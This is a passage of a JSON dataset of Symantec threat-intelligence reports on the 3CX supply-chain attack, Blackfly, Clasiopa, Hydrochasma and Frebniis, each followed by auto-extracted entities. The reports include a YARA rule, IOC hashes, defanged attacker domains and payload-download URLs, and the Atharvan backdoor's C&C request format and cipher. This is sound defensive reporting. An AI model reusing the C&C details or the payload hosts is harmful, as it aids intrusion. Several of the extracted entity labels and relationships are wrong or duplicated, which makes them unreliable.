version of DesktopApp is released. Machine Learning-based For the latest protection updates, please visit theSymantec Protection Bulletin. Yara Rule to detect final infostealer payload rule icon_3cx_stealer { copyright = \"Symantec\" description = \"Infostealer component used in 3CX supply chain attack\" $a1 = \"******************************** %s ******************************\" wide fullword $a2 = \"\\\\3CXDesktopApp\\\\config.json\" wide fullword $a3 = { 7B 00 22 00 48 00 6F 00 73 00 74 00 4E 00 61 00 6D 00 65 00 22 00 3A 00 20 00 22 00 25 00 73 00 22 00 2C 00 20 00 22 00 44 00 6F 00 6D 00 61 00 69 00 6E 00 4E 00 61 00 6D 00 65 00 22 00 3A 00 20 00 22 00 25 00 73 00 22 00 2C 00 20 00 22 00 4F 00 73 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 22 00 3A 00 20 00 22 00 25 00 64 00 2E 00 25 00 64 00 2E 00 25 00 64 00 22 00 7D } $b1 = \"HostName: %s\" wide fullword $b2 = \"DomainName: %s\" wide fullword $b3 = \"OsVersion: %d.%d.%d\" wide fullword $b4 = \"%s.old\" wide fullword 3 of ($a*) and 2 of ($b*) For more information on scanning SEP client computers using custom Yara rules, readthis knowledge base article. dde03348075512796241389dfea5560c20a3d2a2eac95c894e7bbed5e85a0acc – Windows app aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868 – Windows installer fad482ded2e25ce9e1dd3d3ecc3227af714bdfbbde04347dbc1b21d6a3670405 – Windows app 59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983 – Windows installer 92005051ae314d61074ed94a52e76b1c3e21e7f0e8c1d1fdd497a006ce45fa61 – macOS app 5407cda7d3a75e7b1e030b1f33337a56f293578ffa8b3ae19c671051ed314290 – macOS installer b86c695822013483fa4e2dfdf712c5ee777d7b99cbad8c2fa2274b133481eadb – macOS app e6bbc33815b9f20b0cf832d7401dd893fbc467c800728b5891336706da0dbcec – macOS installer 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03 – Infostealer (d3dcompiler_47.dll) 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896 - Infostealer (ffmpeg.dll ) aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973 - Infostealer c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02 - Infostealer (ffmpeg.dll) fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7 - Malicious macOS library (libffmpeg.dylib) a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67 - Malicious macOS library (libffmpeg.dylib) 210c9882eba94198274ebc787fe8c88311af24932832a7fe1f1ca0261f815c3d – Malicious ICO file (icon0.ico) a541e5fc421c358e0a2b07bf4771e897fb5a617998aa4876e0e1baa5fbb8e25c – Malicious ICO file (icon1.ico) d459aa0a63140ccc647e9026bfd1fccd4c310c262a88896c57bbe3b6456bd090 – Malicious ICO file (icon10.ico) d459aa0a63140ccc647e9026bfd1fccd4c310c262a88896c57bbe3b6456bd090 – Malicious ICO file (icon11.ico) d51a790d187439ce030cf763237e992e9196e9aa41797a94956681b6279d1b9a – Malicious ICO file (icon12.ico) 4e08e4ffc699e0a1de4a5225a0b4920933fbb9cf123cde33e1674fde6d61444f – Malicious ICO file (icon13.ico) 8c0b7d90f14c55d4f1d0f17e0242efd78fd4ed0c344ac6469611ec72defa6b2d – Malicious ICO file (icon14.ico) f47c883f59a4802514c57680de3f41f690871e26f250c6e890651ba71027e4d3 – Malicious ICO file (icon15.ico) 2c9957ea04d033d68b769f333a48e228c32bcf26bd98e51310efd48e80c1789f – Malicious ICO file (icon2.ico) 268d4e399dbbb42ee1cd64d0da72c57214ac987efbb509c46cc57ea6b214beca – Malicious ICO file (icon3.ico) c62dce8a77d777774e059cf1720d77c47b97d97c3b0cf43ade5d96bf724639bd – Malicious ICO file (icon4.ico) c13d49ed325dec9551906bafb6de9ec947e5ff936e7e40877feb2ba4bb176396 – Malicious ICO file (icon5.ico) f1bf4078141d7ccb4f82e3f4f1c3571ee6dd79b5335eb0e0464f877e6e6e3182 – Malicious ICO file (icon6.ico) 2487b4e3c950d56fb15316245b3c51fbd70717838f6f82f32db2efcc4d9da6de – Malicious ICO file (icon7.ico) e059c8c8b01d6f3af32257fc2b6fe188d5f4359c308b3684b1e0db2071c3425c – Malicious ICO file (icon8.ico) d0f1984b4fe896d0024533510ce22d71e05b20bad74d53fae158dc752a65782e – Malicious ICO file (icon9.ico) akamaicontainer[.]comakamaitechcloudservices[.]comazuredeploystore[.]comazureonlinecloud[.]comazureonlinestorage[.]comdunamistrd[.]comglcloudservice[.]comjournalide[.]orgmsedgepackageinfo[.]commsstorageazure[.]commsstorageboxes[.]comofficeaddons[.]comofficestoragebox[.]compbxcloudeservices[.]compbxphonenetwork[.]compbxsources[.]comqwepoi123098[.]comsbmsa[.]wikisourceslabs[.]comvisualstudiofactory[.]comzacharryblogs[.]comraw.githubusercontent[.]com/IconStorages/images/main/ The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Yara rule, Tool), (Trojan, Malware), (3CX's DesktopApp, Tool), (Windows, OS), (MacOS, OS), (SolarWinds, Threat Type), (North Korea, Attacker), (information-stealing malware, Malware), (SIDEBAR, Threat Type), (Symantec, Tool), (SHA256, Hash)\nRelationships: (Yara rule, detects, final infostealer payload), (Trojan, usedBy, 3CX's DesktopApp), (3CX's DesktopApp, installs, information-stealing malware), (3CX's DesktopApp, contains, malicious DLLs), (3CX's DesktopApp, installs, SIDEBAR), (3CX's DesktopApp, usedBy, attacker), (attacker, linkedTo, North Korea), (SolarWinds, resembles, SolarWinds), (Windows version, usedBy, attacker), (Windows version, contains, malicious DLLs), (Windows version, installs, information-stealing malware), (Windows version, contains, malicious DLLs), (Windows version, installs, SIDEBAR), (Windows version, contains, malicious DLLs), (Windows version, installs, information-stealing malware), (Windows version, contains, malicious DLLs), (Windows version, installs, information-stealing malware), (Windows version, contains, malicious DLLs), (Windows version, installs, information-stealing malware),",
      "entities": [
        [
          "Yara rule",
          "Tool"
        ],
        [
          "Trojan",
          "Malware"
        ],
        [
          "3CX's DesktopApp",
          "Tool"
        ],
        [
          "Windows",
          "OS"
        ],
        [
          "MacOS",
          "OS"
        ],
        [
          "SolarWinds",
          "Threat Type"
        ],
        [
          "North Korea",
          "Attacker"
        ],
        [
          "information-stealing malware",
          "Malware"
        ],
        [
          "SIDEBAR",
          "Threat Type"
        ],
        [
          "Symantec",
          "Tool"
        ],
        [
          "SHA256",
          "Hash"
        ]
      ],
      "relationships": [
        [
          "Yara rule",
          "detects",
          "final infostealer payload"
        ],
        [
          "Trojan",
          "usedBy",
          "3CX's DesktopApp"
        ],
        [
          "3CX's DesktopApp",
          "installs",
          "information-stealing malware"
        ],
        [
          "3CX's DesktopApp",
          "contains",
          "malicious DLLs"
        ],
        [
          "3CX's DesktopApp",
          "installs",
          "SIDEBAR"
        ],
        [
          "3CX's DesktopApp",
          "usedBy",
          "attacker"
        ],
        [
          "attacker",
          "linkedTo",
          "North Korea"
        ],
        [
          "SolarWinds",
          "resembles",
          "SolarWinds"
        ],
        [
          "Windows version",
          "usedBy",
          "attacker"
        ],
        [
          "Windows version",
          "contains",
          "malicious DLLs"
        ],
        [
          "Windows version",
          "installs",
          "information-stealing malware"
        ],
        [
          "Windows version",
          "contains",
          "malicious DLLs"
        ],
        [
          "Windows version",
          "installs",
          "SIDEBAR"
        ],
        [
          "Windows version",
          "contains",
          "malicious DLLs"
        ],
        [
          "Windows version",
          "installs",
          "information-stealing malware"
        ],
        [
          "Windows version",
          "contains",
          "malicious DLLs"
        ],
        [
          "Windows version",
          "installs",
          "information-stealing malware"
        ],
        [
          "Windows version",
          "contains",
          "malicious DLLs"
        ],
        [
          "Windows version",
          "installs",
          "information-stealing malware"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 11,
    "relationship_count": 19
  },
  {
    "title": "blackfly espionage materials",
    "link": "https://www.security.com/threat-intelligence/blackfly-espionage-materials",
    "content": "The Blackfly espionage group (aka APT41, Winnti Group, Bronze Atlas) has continued to mount attacks against targets in Asia and recently targeted two subsidiaries of an Asian conglomerate, both of which operate in the materials and composites sector, suggesting that the group may be attempting to steal intellectual property. The following tools were used in attacks during late 2022 and early 2023: Blackfly is one of the longest known Chinese advanced persistent threat (APT) groups, active since at least 2010. Early attacks were distinguished by the use of the PlugX/Fast (Backdoor.Korplug), Winnti/Pasteboy (Backdoor.Winnti), and Shadowpad (Backdoor.Shadowpad) malware families. The group initially made a name for itself through attacks on the computer gaming industry. It subsequently branched out into targeting a more diverse range of targets, including organizations in the semiconductor, telecoms, materials manufacturing, pharmaceutical, media and advertising, hospitality, natural resources, fintech, and food sectors. Blackfly has been closely associated with a second Chinese APT group known as Grayfly, so much so that some vendors track the two groups as one actor: APT41.A 2020 indictment of seven men on charges relating to hundreds of cyber attackscarried out by both groups appeared to shed light on this link. Two Chinese nationals were alleged to have worked with both groups. A crossover in personnel may account for the similarities between both groups. Despite being the subject of a U.S. indictment, Blackfly has continued to mount attacks, seemingly undeterred by the publicity afforded to the group. Although it originally made a name for itself by attacking the gaming sector, the group appears focused on targeting intellectual property in a variety of sectors at present. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. cf6bcd3a62720f0e26e1880fe7ac9ca6c62f7f05f1f68b8fe59a4eb47377880a – Backdoor.Winnkit e1e0b887b68307ed192d393e886d8b982e4a2fd232ee13c2f20cd05f91358596 – Backdoor.Winnkit a3078d0c4c564f5efb1460e7d341981282f637d38048501221125756bc740aac – Backdoor.Winnkit 714cef77c92b1d909972580ec7602b0914f30e32c09a5e8cb9cb4d32aa2a2196 – Backdoor.Winnkit 192ef0dee8df73eec9ee617abe4b0104799f9543a22a41e28d4d44c3ad713284 – Backdoor.Winnkit caba1085791d13172b1bb5aca25616010349ecce17564a00cb1d89c7158d6459 – Backdoor.Winnkit 452d08d420a8d564ff5df6f6a91521887f8b9141d96c77a423ac7fc9c28e07e4 – Screenshotting tool 1cc838896fbaf7c1996198309fbf273c058b796cd2ac1ba7a46bee6df606900e – Process-hollowing tool 4ae2cb9454077300151e701e6ac4e4d26dc72227135651e02437902ac05aa80d – SQL tool 560ea79a96dc4f459e96df379b00b59828639b02bd7a7a9964b06d04cb43a35a – DCSync b28456a0252f4cd308dfb84eeaa14b713d86ba30c4b9ca8d87ba3e592fd27f1c – Mimikatz a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864 – ForkPlayground 5e51bdf067e5781d2868d97e7608187d2fec423856dbc883c6f81a9746e99b9f – Proxy configuration tool d4e1f09cb7b9b03b4779c87f2a10d379f1dd010a9686d221c3a9f45bda5655ee – Proxy configuration tool f138d785d494b8ff12d4a57db94958131f61c76d5d2c4d387b343a213b29d18f – Proxy configuration tool 88113bebc49d40c0aa1f1f0b10a7e6e71e4ed3ae595362451bd9dcebcf7f8bf4 – Proxy configuration tool 498e8d231f97c037909662764397e02f67d0ee16b4f6744cf923f4de3b522bc1 – Proxy configuration tool 100cad54c1f54126b9d37eb8c9e426cb609fc0eda0e9a241c2c9fd5a3a01ad6c – Credential-dumping tool The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Blackfly, Attacker), (PlugX/Fast, Malware), (Winnti/Pasteboy, Malware), (Shadowpad, Malware), (Grayfly, Attacker), (APT41, Attacker), (Apt41.A, Indictment)\nRelationships: (Blackfly, uses, PlugX/Fast), (Blackfly, uses, Winnti/Pasteboy), (Blackfly, uses, Shadowpad), (Blackfly, associatedWith, Grayfly), (APT41, uses, PlugX/Fast), (APT41, uses, Winnti/Pasteboy), (APT41, uses, Shadowpad), (APT41, associatedWith, Grayfly), (APT41.A, indictedBy, APT41)",
      "entities": [
        [
          "Blackfly",
          "Attacker"
        ],
        [
          "PlugX/Fast",
          "Malware"
        ],
        [
          "Winnti/Pasteboy",
          "Malware"
        ],
        [
          "Shadowpad",
          "Malware"
        ],
        [
          "Grayfly",
          "Attacker"
        ],
        [
          "APT41",
          "Attacker"
        ],
        [
          "Apt41.A",
          "Indictment"
        ]
      ],
      "relationships": [
        [
          "Blackfly",
          "uses",
          "PlugX/Fast"
        ],
        [
          "Blackfly",
          "uses",
          "Winnti/Pasteboy"
        ],
        [
          "Blackfly",
          "uses",
          "Shadowpad"
        ],
        [
          "Blackfly",
          "associatedWith",
          "Grayfly"
        ],
        [
          "APT41",
          "uses",
          "PlugX/Fast"
        ],
        [
          "APT41",
          "uses",
          "Winnti/Pasteboy"
        ],
        [
          "APT41",
          "uses",
          "Shadowpad"
        ],
        [
          "APT41",
          "associatedWith",
          "Grayfly"
        ],
        [
          "APT41.A",
          "indictedBy",
          "APT41"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 7,
    "relationship_count": 9
  },
  {
    "title": "clasiopa materials research",
    "link": "https://www.security.com/threat-intelligence/clasiopa-materials-research",
    "content": "A hitherto unknown attack group has been observed targeting a materials research organization in Asia. The group, which Symantec calls Clasiopa, is characterized by a distinct toolset, which includes one piece of custom malware (Backdoor.Atharvan). At present, there is no firm evidence on where Clasiopa is based or whom it acts on behalf. The infection vector used by Clasiopa is unknown, although there is some evidence to suggest that the attackers gain access through brute force attacks on public facing servers. Aside from the distinct toolset used, there were a number of attack hallmarks observed: There is some evidence to suggest that the attackers used two legitimate software packages. One compromised computer was running Agile DGS and Agile FD servers, software developed by Jiangsu. These packages are used for document security and protection in transit. Malicious files were dropped into a folder named “dgs” and one of the backdoors used was renamed from atharvan.exe to agile_update.exe. It is unclear if these software packages are being injected into or installed by the attackers. HCL Domino (formerly IBM Domino) was also run on a compromised machine in close proximity to the execution of backdoors, although it is unclear if this was a coincidence or not. However, both the Domino and Agile software appear to be using old certificates and the Agile servers use old vulnerable libraries. Atharvan is so-named because when the malware is run, it creates a mutex named: \"SAPTARISHI-ATHARVAN-101\" to ensure that only one copy is running. It will then contact a hardcoded C&C server. The hardcoded C&C addresses seen in one of the samples analyzed to date was for Amazon AWS South Korea (Seoul) region, which is not a common location for C&C infrastructure. The C&C communications are formatted as HTTP POST requests where the Host header is hardcoded as \"update.microsoft.com\", e.g.: POST /update.php HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.52 Host: update.microsoft.com Content-type: application/x-www-form-urlencoded id=Atharvan&code=101&cid=H^[REDACTED]&time=5 The request body includes the following parameters: When encrypting the \"msg\" value, the malware uses the following encryption algorithm: def encrypt(plaintext): return bytes([((2 - byte) & 0xff) for byte in plaintext]) The malware uses its own simplistic HTTP parser to extract the body from the server response. The extracted body is decrypted using the following algorithm: def decrypt(ciphertext): return bytes([((2 - byte) & 0xff) for byte in ciphertext]) When fetching commands, the malware expects the decrypted body to contain a sequence of strings separated by the \"\\x1A\" character. The first byte of each string specifies the command to execute and the remaining bytes are interpreted as command parameters. When configuring a communication schedule, the command parameters specify the times and days for the communication attempts. Several different times can be specified, with the hour and minute of the day encoded. The days are interpreted as: This scheduled communication configuration is another unusual feature of the malware and is not commonly seen in malware of this kind. There is currently no firm evidence on where Clasiopa is based or what its motivation is. A Hindi mutex is used in the Atharvan backdoor: \"SAPTARISHI-ATHARVAN-101\". Atharvan is alegendary Vedic sage of Hinduism. The backdoor also sends a post request to a C&C server with the arguments: In addition to this, one of the passwords used by the attackers for a ZIP archive was “iloveindea1998^_^”. While these details could suggest that the group is based in India, it is also quite likely that the information was planted as false flags, with the password in particular seeming to be an overly obvious clue. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 5b74b2176b8914b0c4e6215baab9e96d1e9a773803105cf50dac0427fac79c1b – Backdoor.Atharvan 8aa6612c95c7cef49709596da43a0f8354f14d8c08128c4cb9b1f37e548f083b – Backdoor.Atharvan 95f76a95adcfdd91cb626278006c164dcc46009f61f706426b135cdcfa9598e3 – Lilith 940ab006769745b19de5e927d344c4a4f29cae08e716ee0b77115f5f2a2e3328 – Lilith 38f0f2d658e09c57fc78698482f2f638843eb53412d860fb3a99bb6f51025b07 – Lilith c94c42177d4f9385b02684777a059660ea36ce6b070c2dba367bf8da484ee275 – Thumbsender f93ddb2377e02b0673aac6d540a558f9e47e611ab6e345a39fd9b1ba9f37cd22 – Custom Proxy Tool 3aae54592fe902be0ca1ab29afe5980be3f96888230d5842e93b3ca230f8d18d – Backdoor 0550e1731a6aa2546683617bd33311326e7b511a52968d24648ea231da55b7e5 – Backdoor 8023b2c1ad92e6c5fec308cfafae3710a5c47b1e3a732257b69c0acf37cb435b – Hacktool 1569074db4680a9da6687fb79d33160a72d1e20f605e661cc679eaa7ab96a2cd – Hacktool The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Clasiopa, Attacker), (Backdoor.Atharvan, Malware), (Agile DGS, Tool), (Agile FD, Tool), (HCL Domino, Tool), (IBM Domino, Tool), (mutex, Hash)\nRelationships: (Clasiopa, uses, Backdoor.Atharvan), (Clasiopa, uses, Agile DGS), (Clasiopa, uses, Agile FD), (Clasiopa, uses, HCL Domino), (Clasiopa, uses, IBM Domino), (Atharvan, contains, mutex), (mutex, resolvesTo, Atharvan)",
      "entities": [
        [
          "Clasiopa",
          "Attacker"
        ],
        [
          "Backdoor.Atharvan",
          "Malware"
        ],
        [
          "Agile DGS",
          "Tool"
        ],
        [
          "Agile FD",
          "Tool"
        ],
        [
          "HCL Domino",
          "Tool"
        ],
        [
          "IBM Domino",
          "Tool"
        ],
        [
          "mutex",
          "Hash"
        ]
      ],
      "relationships": [
        [
          "Clasiopa",
          "uses",
          "Backdoor.Atharvan"
        ],
        [
          "Clasiopa",
          "uses",
          "Agile DGS"
        ],
        [
          "Clasiopa",
          "uses",
          "Agile FD"
        ],
        [
          "Clasiopa",
          "uses",
          "HCL Domino"
        ],
        [
          "Clasiopa",
          "uses",
          "IBM Domino"
        ],
        [
          "Atharvan",
          "contains",
          "mutex"
        ],
        [
          "mutex",
          "resolvesTo",
          "Atharvan"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 7,
    "relationship_count": 7
  },
  {
    "title": "hydrochasma asia medical shipping intelligence gathering",
    "link": "https://www.security.com/threat-intelligence/hydrochasma-asia-medical-shipping-intelligence-gathering",
    "content": "Shipping companies and medical laboratories in Asia are being targeted in a likely intelligence-gathering campaign that relies exclusively on publicly available and living-off-the-land tools. Hydrochasma, the threat actor behind this campaign, has not been linked to any previously identified group, but appears to have a possible interest in industries that may be involved in COVID-19-related treatments or vaccines. This activity has been ongoing since at least October 2022. While Symantec, byBroadcom Software, did not see any data being exfiltrated in this campaign, the targets, as well as some of the tools used, indicate that the most likely motivation in this campaign is intelligence gathering. The infection vector used by Hydrochasma was most likely a phishing email. The first suspicious activity seen on machines is a lure document with a file name in the victim organization’s native language that appears to indicate it was an email attachment: [TRANSLATED FROM THE ORIGINAL] Product Specification-Freight-Company Qualification Information wps-pdf Export.pdf.exe Another lure document appears to be mimicking a resume: [TRANSLATED FROM THE ORIGINAL] [REDACTED] University-Development Engineer.exe Following initial access on one machine, the attackers were seen dropping Fast Reverse Proxy (FRP), a tool that can expose a local server that is sitting behind an NAT or firewall to the internet. This drops a legitimate Microsoft Edge update file: %TEMP%\\MicrosoftEdgeUpdate.exe Another file,%TEMP%\\msedgeupdate.dll, is then seen on victim machines. But this file is actually Meterpreter, a tool that is part of the Metasploit framework and which can be used for remote access. Other tools that were subsequently seen on this victim’s network included: A shellcode loader and a corrupted portable executable (PE) file were also deployed on this victim’s network. Other tactics, techniques, and procedures (TTPs) observed being used in this campaign included: The tools deployed by Hydrochasma indicate a desire to achieve persistent and stealthy access to victim machines, as well as an effort to escalate privileges and spread laterally across victim networks. While Symantec researchers didn’t observe data being exfiltrated from victim machines, some of the tools deployed by Hydrochasma do allow for remote access and could potentially be used to exfiltrate data. The sectors targeted also point towards the motivation behind this attack being intelligence gathering. The lack of custom malware used in this attack is also notable. Relying exclusively on living-off-the-land and publicly available tools can help make an attack stealthier, while also making attribution more difficult. Symantec did not see evidence to link this activity to a known actor, prompting us to create the new actor identity of Hydrochasma for those behind this activity. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 409f89f4a00e649ccd8ce1a4a08afe03cb5d1c623ab54a80874aebf09a9840e5 – Fast Reverse Proxy 47d328c308c710a7e84bbfb71aa09593e7a82b707fde0fb9356fb7124118dc88 – GoGo Scanning Tool 6698a81e993363fab0550855c339d9a20a25d159aaa9c4b91f60bb4a68627132 – Dropper 7229bd06cb2a4bbe157d72a3734ba25bc7c08d6644c3747cdc4bcc5776f4b5b9 – Process Dumper (lsass.exe) 72885373e3e8404f1889e479b3d46dd8111280379c4065bfc1e62df093e42aba – Fast Reverse Proxy 72bc8b30df3cdde6c58ef1e8a3eae9e7882d1abe0b7d4810270b5a0cc077bb1a – Cobalt Strike Beacon 7b410fa2a93ed04a4155df30ffde7d43131c724cdf60815ee354988b31e826f8 – Fast Reverse Proxy 7f0807d40e9417141bf274ef8467a240e20109a489524e62b090bccdb4998bc6 – Process Dumper (lsass.exe) 8c0f0d1acb04693a6bdd456a6fcd37243e502b21d17c8d9256940fc7943b1e9a – Cobalt Strike Beacon 8e32ea45e1139b459742e676b7b2499810c3716216ba2ec55b77c79495901043 – Fast Reverse Proxy 981e5f7219a2f92a908459529c42747ac5f5a820995f66234716c538b19993eb – GoGo Scanning Tool 9ebd789e8ca8b96ed55fc8e95c98a45a61baea3805fd440f50f2bde5ffd7a372 – Fast Reverse Proxy 9f5f7ba7d276f162cc32791bfbaa0199013290a8ac250eb95fd90bc004c3fd36 – Cobalt Strike Beacon a0f5966fcc64ce2d10f24e02ae96cdc91590452b9a96b3b1d4a2f66c722eec34 – AllIn Scanning Tool cb03b5d517090b20749905a330c55df9eb4d1c6b37b1b31fae1982e32fd10009 – Fscan d1c4968e7690fd40809491acc8787389de0b7cbc672c235639ae7b4d07d04dd4 – Shellcode Loader de01492b44372f2e4e38354845e7f86e0be5fb8f5051baafd004ec5c1567039f – Cobalt Strike Beacon e378d8b5a35d4ec75cae7524e64c1d605f1511f9630c671321ee46aa7c4d378b – PE File eba22f50eedfec960fac408d9e6add4b0bd91dd5294bee8cff730db53b822841 – Dropper fc4b5f2ee9da1fe105bb1b7768754d48f798bf181cbc53583387578a5ebc7b56 – Dogz Proxy Tool 02fe00ffd1b076983f3866c04ca95c56cef88c2564fabb586e11e54986e87ba7 084d1fc4236011d442801e423485c8e58f68dc14ec0a8b716fa0fd210de43dda 1744fac628262aa0cf3810bd5168375959be41764c8ca2fa41950a7b1f8f2fad 1d087f6a17227769bcebc799a2cdf1bb2a8fdf6ba560d21a88bb71f1c213a42c 327fc116f8f48f97292184bb50cb3db418f368b3e2a0fb41267ba40254a35a89 3516f94b0fb57e93c6659d813cbf5fb3617dea7a667c78cb70a1914306327906 41b6d26926706bb68530ddff234f69757e3bbef91c47eb0255313ed86cb3f806 44223e5abd106c077908f03c93b8c8baee7d630f1718f9750f16b786cf88fd06 553e0763cf3a938b5754c9d89939a118abe0b235e4be6920c34f562bd758e586 5a62abc0a2208679e414cc71d1f36ffa14b48df2b73ac520e45d557ad77dd004 6770f815480d7cfa0a6fc8599c08ca6013f608d257a2121233e77374e21c53f8 6cb815863088a0ad367b2a525a572323600596f6875a79536aee57202ef24fd5 6f017ad84d0d06f50b6213a0742838b5ec510f3d06f96e0300048f2da6a35c41 7394ab0ed6d1f62e83fc5f8f1eb720ddd07cbd2bcdf6a00b9b63ef6018fa5f90 7800a4fb0cbdf29815c521ea8b00a23e28d7eb365653f2afcfb5572622727218 7f6a1d6950a9464f27d8651a267563d4630d223bf7ac66851917a57f8fac6550 84502fbe3e5172c39e9a97734e6caac79255abffcb55c22752620d908ff33940 916b63b88de2549c4a5c8e13d51df4cf6996067ae30f24c8bb35c66db7c061df 968b28f7d6abb845f2cc7efa93cdcf7660585e22d589267695726de13afea260 9e8b5a84ad108a761619ca040788dcbf07996a9101cecc5c30ba61f9a06945c1 b53d0a43ea91b3c80bc6c87c0c6946816c38876b2cb2f6f772afe94c54d3ad30 b5c4f420067499522b748a34161ad6e140a7f30ab0b8fa63feef760c5e631679 d0ae66022929c17f31ddf98d88817f0aa70a56ce2ff2df9595b8889c2d3d7e31 d92c50a91bd5b2f06f41a9a5f9937e50b78658d46e3cd04bc3a85f270ce288c2 dc3b714fd6f93c0c0cd2685b6b8cd551896855474bdd09593b8c6b4b7ab6bac2 e7684a4984d9d82115c5cc1b43b9f63a11e7ed333a4e2d92dc15b6e931634bf4 ebc3dabf0a2dafb0790be6dbb4d3509b5ce1259b955172910618a32627b3b668 ee9aefde33ed48d16ecb1c41256fc7d93ddfa8bedfa59b95e8810282ac164d0d f35b206fe10ad3f57d9c4ecf71a2d2cc06d7c7fe905e567b989f72f147da99dc f73738e6e33286657cda81f618a74b74745590915a8f4451e7c00473cbe89e1d fc8a67b80b0b0ecd10dfd90820ffc64923b94c32b04dbb6929a79b9ce027563c ffdcf74968805e9cc897ca932e4da0f22ea7b3e9b96fcc9082c0c5300ae4cb0d 39.101.194[.]61 – Cobalt Strike Beacon C&C 47.92.138[.]241 – Cobalt Strike Beacon C&C alidocs.dingtalk[.]com.wswebpic[.]com – Cobalt Strike Beacon C&C csc.zte[.]com.cn.wswebpic[.]com – Cobalt Strike Beacon C&C taoche[.]cn.wswebpic[.]com – Cobalt Strike Beacon C&C hxxp://47.92.138[.]241:8090/update.exe hxxp://47.92.138[.]241:8000/agent.exe hxxp://47.92.138[.]241:8000/update.exe hxxp://47.92.138[.]241:8000/ff.exe hxxp://47.92.138[.]241:8000/aa.exe hxxp://47.92.138[.]241:8000/runas.exe hxxp://47.92.138[.]241:8090/a.exe hxxp://47.92.138[.]241:8000/t.exe hxxp://47.92.138[.]241:8000/po.exe hxxp://47.92.138[.]241:8080/t.exe hxxp://47.92.138[.]241:8899/t.exe hxxp://47.92.138[.]241:8000/logo.png hxxp://47.92.138[.]241:8080/t.png hxxp://47.92.138[.]241:8000/frp.exe The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Shipping companies, Entity), (medical laboratories, Entity), (intelligence-gathering campaign, Threat Type), (Hydrochasma, Attacker), (living-off-the-land tools, Tool), (Symantec, Tool), (byBroadcom Software, Tool), (COVID-19-related treatments or vaccines, Vulnerability), (October 2022, Time Period), (Fast Reverse Proxy (FRP), Tool), (Microsoft Edge update file, File), (NAT or firewall, Network Device)\nRelationships: (shipping companies, target, intelligence-gathering campaign), (medical laboratories, target, intelligence-gathering campaign), (Hydrochasma, uses, living-off-the-land tools), (Hydrochasma, uses, Fast Reverse Proxy (FRP)), (Hydrochasma, uses, Microsoft Edge update file), (Hydrochasma, uses, NAT or firewall)",
      "entities": [
        [
          "Shipping companies",
          "Entity"
        ],
        [
          "medical laboratories",
          "Entity"
        ],
        [
          "intelligence-gathering campaign",
          "Threat Type"
        ],
        [
          "Hydrochasma",
          "Attacker"
        ],
        [
          "living-off-the-land tools",
          "Tool"
        ],
        [
          "Symantec",
          "Tool"
        ],
        [
          "byBroadcom Software",
          "Tool"
        ],
        [
          "COVID-19-related treatments or vaccines",
          "Vulnerability"
        ],
        [
          "October 2022",
          "Time Period"
        ],
        [
          "Microsoft Edge update file",
          "File"
        ],
        [
          "NAT or firewall",
          "Network Device"
        ]
      ],
      "relationships": [
        [
          "shipping companies",
          "target",
          "intelligence-gathering campaign"
        ],
        [
          "medical laboratories",
          "target",
          "intelligence-gathering campaign"
        ],
        [
          "Hydrochasma",
          "uses",
          "living-off-the-land tools"
        ],
        [
          "Hydrochasma",
          "uses",
          "Fast Reverse Proxy (FRP"
        ],
        [
          "Hydrochasma",
          "uses",
          "Microsoft Edge update file"
        ],
        [
          "Hydrochasma",
          "uses",
          "NAT or firewall"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 11,
    "relationship_count": 6
  },
  {
    "title": "frebniis malware iis",
    "link": "https://www.security.com/threat-intelligence/frebniis-malware-iis",
    "content": "Symantec, byBroadcom Software, has observed a new malware that abuses a feature of Microsoft’s Internet Information Services (IIS) to deploy a backdoor onto targeted systems. The malware, dubbed Frebniis (Backdoor.Frebniis), was used by a currently unknown threat actor against targets in Taiwan. The technique used by Frebniis involves injecting malicious code into the memory of a DLL file (iisfreb.dll) related to an IIS feature used to troubleshoot and analyze failed web page requests. This allows the malware to stealthily monitor all HTTP requests and recognize specially formatted HTTP requests sent by the attacker, allowing for remote code execution. In order to use this technique, an attacker needs to gain access to the Windows system running the IIS server by some other means. In this particular case, it is unclear how this access was achieved. IIS is a general-purpose web server that runs on Windows systems to serve requested HTML pages or files. An IIS web server accepts requests from remote client computers and returns the appropriate response. IIS has a feature known as Failed Request Event Buffering (FREB) that collects data and details about requests, such as originating IP address and 